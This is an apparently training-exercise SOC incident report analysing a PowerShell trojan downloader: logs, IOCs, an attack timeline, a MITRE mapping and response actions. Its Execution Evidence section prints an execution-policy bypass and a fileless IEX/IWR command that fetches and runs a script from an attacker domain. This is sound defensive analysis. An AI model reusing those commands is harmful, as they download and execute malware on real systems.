# SOC153 - Suspicious Powershell Script Executed

**Reported by:** Nizamudheen KN  
**Completed date:** 13-03-2026  

---

## Executive Summary

On March 14, 2024 at 05:23 PM, a suspicious PowerShell 
script (payload_1.ps1) was detected executing on the 
endpoint hostname Tony (172.16.17.206). 

The malware was delivered via a phishing link, which 
caused the user to unknowingly download the malicious 
script from the internet through Chrome browser. Upon 
execution, the script successfully established 
communication with attacker-controlled Command and 
Control (C2) infrastructure and attempted to deploy 
a second stage payload using fileless execution techniques.

The Antivirus detected the threat but failed to block 
it, leaving the machine actively compromised.

Verdict   : True Positive  
Attack    : PowerShell Trojan Downloader  
Severity  : Critical  
Status    : NOT Contained  

## 2. Alert Details

| Field | Value |
|---|---|
| **Event ID** | 238 |
| **Rule Name** | SOC153 - Suspicious PowerShell Script Executed |
| **Date & Time** | March 14, 2024, 05:23 PM |
| **Hostname** | Tony |
| **IP Address** | 172.16.17.206 |
| **File Name** | payload_1.ps1 |
| **File Path** | C:\Users\LetsDefend\Downloads\payload_1.ps1 |
| **File Hash** | db8be06ba6d2d3595dd0c86654a48cfc4c0c5408fdd3f4e1eaf342ac7a2479d0 |
| **AV/EDR Action** | Detected (NOT Blocked) |
| **Alert Type** | Malware |
| **Severity** | Medium (Escalated to Critical) |

## 3. Analysis

### 3.1 File Hash Analysis (VirusTotal)

| Field | Value |
|---|---|
| **Hash** | db8be06ba6d2d3595dd0c86654a48cfc4c0c5408fdd3f4e1eaf342ac7a2479d0 |
| **Detection Score** | 33/62 vendors flagged as malicious |
| **Popular Threat Label** | trojan.powershell/boxter |
| **Threat Categories** | Trojan, Downloader |
| **Family Labels** | powershell, boxter, azorult |
| **File Size** | 7.14 KB |
| **Known Names** | agent3.ps1, payload_1.ps1 |
| **Community Score** | -1 |

#### Behaviour Tags
| Tag | Meaning |
|---|---|
| `powershell` | Abuses PowerShell engine |
| `detect-debug-environment` | Checks if running in sandbox to evade analysis |
| `exe-pattern` | Contains executable code patterns |
| `url-pattern` | Has hardcoded malicious URLs |
| `long-sleeps` | Sleeps randomly to evade behavioral detection |
| `checks-network-adapters` | Fingerprints the victim machine |

#### Notable Vendor Detections
| Vendor | Detection |
|---|---|
| AhnLab-V3 | Trojan/PowerShell.Downloader.SC205541 |
| DrWeb | PowerShell.Loader.3 |
| ESET-NOD32 | PowerShell/Injector.FH Trojan |
| Huorong | HEUR:Trojan/PS.AmsiBypass.a |
| Microsoft | Trojan:PowerShell/Azorult.RPAIMTB |
| Cynet | Malicious (score: 99) |

#### Contacted Infrastructure (Relations Tab)
| Type | Value | Detections | Note |
|---|---|---|---|
| URL | https://kionagranada.com/upload/beauty.exe | 9/98 | Stage 2 payload |
| Domain | kionagranada.com | 1/94 | Attacker delivery server |
| IP | 161.22.46.148 | 0/94 | C2 server — Spain |
| IP | 192.229.221.95 | 0/94 | Contacted IP |

> **Note:** 11 files dropped and 10+ additional files 
> identified — confirming multi-stage payload delivery.

### 3.2 Log Analysis

#### Connection 1 — Malware Download
| Field | Value |
|---|---|
| **Time** | Mar 14, 2024, 05:22 PM |
| **Source** | 172.16.17.206 (Tony) |
| **Destination IP** | 3.5.130.147 |
| **Destination Port** | 443 (HTTPS) |
| **Process** | chrome.exe |
| **URL** | https://files-ld.s3.us-east-2.amazonaws.com/payload_1.ps1 |
| **Action** | Allowed |

> Tony downloaded payload_1.ps1 via Chrome 
> browser from an AWS S3 link — most likely 
> delivered via a phishing email or malicious link.

#### Connection 2 — C2 Check-in
| Field | Value |
|---|---|
| **Time** | Mar 14, 2024, 05:23 PM |
| **Source** | 172.16.17.206 (Tony) |
| **Destination IP** | 91.236.116.163 |
| **Destination Port** | 80 (HTTP) |
| **Process** | powershell.exe |
| **URL** | HTTP://91.236.116.163/INDEX.PHP?ID=90059C37&SUBID=9G6CLLE6 |
| **Status** | 200 (SUCCESS) |

> Malware successfully registered Tony's infected 
> machine with the attacker's C2 server using a 
> unique victim ID. Status 200 confirms the 
> attacker's server responded.

#### Connection 3 — Stage 2 C2
| Field | Value |
|---|---|
| **Time** | Mar 14, 2024, 05:23 PM |
| **Source** | 172.16.17.206 (Tony) |
| **Destination IP** | 161.22.46.148 |
| **Destination Port** | 443 (HTTPS) |
| **Process** | powershell.exe |
| **Status** | SUCCESS |

> PowerShell directly connected to attacker 
> infrastructure — direct proof of active 
> malware execution communicating with C2 server.

### 3.3 Execution Evidence

#### Log 1 — Process Creation (EventID 1)
| Field | Value |
|---|---|
| **EventID** | 1 (Process Create) |
| **Username** | LetsDefend |
| **Image** | C:\Windows\System32\WINDOWSPOWERSHELL\V1.0\powershell.exe |
| **CommandLine** | powershell.exe -Command "if((Get-ExecutionPolicy) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\LetsDefend\Downloads\payload_1.ps1'" |
| **Original Filename** | payload_1.ps1 |
| **Directory** | C:\Users\LetsDefend\Downloads\ |
| **Hash** | db8be06ba6d2d3595dd0c86654a48cfc4c0c5408fdd3f4e1eaf342ac7a2479d0 |
| **PID** | 4315 |

> This log captures the exact moment payload_1.ps1 
> was executed. The malware first checked and bypassed 
> the PowerShell ExecutionPolicy security restriction 
> before running — a deliberate evasion technique.

#### Log 2 — Remote Command Execution (EventID 4104)
| Field | Value |
|---|---|
| **EventID** | 4104 (Execute a Remote Command) |
| **Username** | LetsDefend |
| **PID** | 6968 |
| **Script Block** | cmd.exe /c "powershell -command IEX(IWR -UseBasicParsing 'https://kionagranada.com/upload/sd2.ps1')" |

> The malware used IEX (Invoke-Expression) combined 
> with IWR (Invoke-WebRequest) to download and execute 
> sd2.ps1 directly in memory without saving to disk.
> This is a Fileless Malware technique designed to 
> evade antivirus tools that scan files on disk.

#### Log 3 — DNS Query (EventID 22)
| Field | Value |
|---|---|
| **EventID** | 22 (DNS Query) |
| **Source** | Sysmon |
| **Username** | Tony |
| **Query Name** | kionagranada.com |
| **Query Result** | 161.22.46.148 |
| **Process** | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe |
| **Time** | Mar 14, 2024, 05:23 PM |

> PowerShell performed a DNS lookup for 
> kionagranada.com and resolved it to 161.22.46.148 
> — confirming the malware actively reached out to 
> the attacker's delivery server to download the 
> Stage 2 payload sd2.ps1.

## 4. Attack Timeline

| Time | Event |
|---|---|
| **05:22 PM** | Tony clicks phishing link and downloads payload_1.ps1 via Chrome browser from AWS S3 (3.5.130.147:443) |
| **05:23 PM** | Malware bypasses PowerShell ExecutionPolicy security restriction and executes payload_1.ps1 (PID: 4315) |
| **05:23 PM** | PowerShell performs DNS lookup — kionagranada.com resolves to 161.22.46.148 |
| **05:23 PM** | Malware successfully checks in with C2 server 91.236.116.163:80 — Status 200, victim registered with unique ID |
| **05:23 PM** | PowerShell connects to 161.22.46.148:443 — Stage 2 C2 communication established successfully |
| **05:23 PM** | Malware downloads and executes sd2.ps1 from kionagranada.com directly in memory using fileless IEX/IWR technique |
| **05:23 PM** | Antivirus detects payload_1.ps1 but fails to block or quarantine — machine remains actively compromised |

## 5. Indicators of Compromise (IOCs)

### Malicious Files
| Filename | Type | Description |
|---|---|---|
| **payload_1.ps1** | PowerShell Script | Main malware — Trojan Downloader. Downloaded by Tony via Chrome from AWS S3 |
| **sd2.ps1** | PowerShell Script | Stage 2 payload — downloaded and executed in memory via fileless IEX/IWR technique |
| **beauty.exe** | Executable | Additional Stage 2 payload hosted on attacker delivery server kionagranada.com |

### Malicious IP Addresses
| IP Address | Owner | Country | Role |
|---|---|---|---|
| **3.5.130.147** | Amazon AWS | 🇺🇸 USA | Hosted payload_1.ps1 for download — trusted infrastructure abused |
| **91.236.116.163** | w1n ltd | 🇸🇪 Sweden | C2 check-in server — victim registration, Status 200 confirmed |
| **161.22.46.148** | Cloudi Nextgen Sl | 🇪🇸 Spain | Stage 2 C2 server — powershell.exe connected directly |

### Malicious Domains
| Domain | Role | Resolved IP |
|---|---|---|
| **kionagranada.com** | Attacker delivery server — hosted sd2.ps1 and beauty.exe | 161.22.46.148 |

### Malicious Hashes
| Hash | File | Detections |
|---|---|---|
| db8be06ba6d2d3595dd0c86654a48cfc4c0c5408fdd3f4e1eaf342ac7a2479d0 | payload_1.ps1 | 33/62 VirusTotal vendors |

> **Important Note:** All three C2 IP addresses 
> show clean scores on VirusTotal. This demonstrates 
> that reputation alone is insufficient for threat 
> detection — context, behavior and correlation 
> are essential for accurate analysis.

## 6. MITRE ATT&CK Mapping

| Technique | ID | Description |
|---|---|---|
| **Phishing** | T1566 | Tony was tricked via phishing link into downloading payload_1.ps1 |
| **PowerShell** | T1059.001 | Malware used PowerShell engine to execute malicious script |
| **Fileless Execution** | T1059.001 | IEX/IWR used to download and run sd2.ps1 directly in memory — never saved to disk |
| **Execution Policy Bypass** | T1059.001 | Malware bypassed PowerShell ExecutionPolicy before executing |
| **Sandbox Evasion** | T1497 | Malware checked for debug/sandbox environment before running |
| **Masquerading** | T1036 | beauty.exe disguised with innocent name to avoid suspicion |
| **Command and Control** | T1071 | Malware communicated with 3 attacker C2 servers after execution |
| **Ingress Tool Transfer** | T1105 | Malware downloaded additional payloads from kionagranada.com |
| **AMSI Bypass** | T1562.001 | Malware attempted to bypass Windows Antimalware Scan Interface |

## 7. Verdict

| Field | Value |
|---|---|
| **Classification** | ✅ True Positive |
| **Attack Type** | PowerShell Trojan Downloader |
| **Severity** | 🔴 Critical |
| **Containment Status** | ❌ NOT Contained |
| **Impact** | Tony's machine is actively infected with C2 malware — attacker has established persistent communication with the compromised endpoint |

### Verdict Justification
The alert is classified as a True Positive based on:

- payload_1.ps1 confirmed malicious — 33/62 
  VirusTotal detections
- Malware successfully executed and bypassed 
  PowerShell security restrictions
- 3 successful C2 connections established
- Fileless Stage 2 payload sd2.ps1 downloaded 
  and executed in memory
- AV detected but failed to block the threat
- Machine remained actively compromised 
  30+ hours after alert

## 8. Response Actions

### 🔴 Immediate (Within Minutes)
| Priority | Action |
|---|---|
| 1 | **Isolate Tony's machine** from the network immediately — disconnect from internet and internal network to stop C2 communication |
| 2 | **Block all C2 IPs** on firewall — 91.236.116.163, 3.5.130.147, 161.22.46.148 |
| 3 | **Block domain** kionagranada.com on DNS and proxy |
| 4 | **Notify Tony** — instruct him to stop using the machine immediately |

### 🟡 Urgent (Within Hours)
| Priority | Action |
|---|---|
| 1 | **Check if beauty.exe or sd2.ps1 were successfully downloaded** and executed on Tony's machine |
| 2 | **Investigate network traffic** around alert time — look for any data exfiltration attempts via C2 connections |
| 3 | **Find the phishing email** Tony received — check Email Security logs for malicious links |
| 4 | **Reset Tony's credentials** — attacker may have stolen passwords via the malware |
| 5 | **Take memory dump** of Tony's machine before isolating — preserve forensic evidence |

### 🟠 Important (Within 24 Hours)
| Priority | Action |
|---|---|
| 1 | **Scan all other machines** on the network for the same file hash — db8be06ba6d2d... |
| 2 | **Check all endpoints** for connections to the 3 C2 IPs — more machines may be infected |
| 3 | **Reimage Tony's machine** after forensic analysis is complete |
| 4 | **Deploy PowerShell script block logging** across all endpoints to detect similar attacks |
| 5 | **Improve email filtering** to block phishing links and malicious attachments |
| 6 | **Enforce PowerShell ExecutionPolicy** — set to AllSigned across all machines |
